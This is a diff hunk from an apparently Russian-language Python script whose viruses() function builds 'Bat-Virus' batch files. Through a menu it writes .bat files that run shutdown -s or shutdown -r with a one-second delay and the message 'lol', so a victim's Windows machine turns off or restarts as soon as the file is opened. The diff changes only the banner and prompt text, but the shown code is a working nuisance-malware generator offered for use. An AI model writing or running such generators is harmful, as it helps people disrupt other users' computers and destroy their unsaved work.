@@ -978,28 +978,27 @@ def viruses():
 	 | __ )  __ _| |_   \ \   / (_)_ __ _   _ ___ 
 	 |  _ \ / _` | __|___\ \ / /| | '__| | | / __|
 	 | |_) | (_| | ||_____\ V / | | |  | |_| \__ \\
-	 
-	 
 	 |____/ \__,_|\__|     \_/  |_|_|   \__,_|___/
                                               '''
 		print(bannerb)
 		print('Какой батник создать?')
 		text = '''
-			[1]-Выключается компьютер
-			[2]-Перезагрузка компьютера
+	      Какой батник создать?
+		[1]-Выключается компьютер
+		[2]-Перезагрузка компьютера
 
 		'''
 		print(text)
 		bat = int(input('bat-virus~#:'))
 		def bat1():
 			os.chdir('batniki')
-			n = str(input('Имя вашего батника .bat:'))
+			n = str(input('Имя вашего батника .bat :'))
 			k = open(n,"w",encoding='utf-8')
 			k.write("""@echo off shutdown -s -t 1 -c "lol" >nul""")
 			k.close()
 		def bat2():
 			os.chdir('batniki')
-			n = str(input('Имя вашего батника .bat:'))
+			n = str(input('Имя вашего батника .bat :'))
 			k = open(n,"w",encoding='utf-8')
 			k.write("""@echo off shutdown -r -t 1 -c "lol" >nul""")
 			k.close()
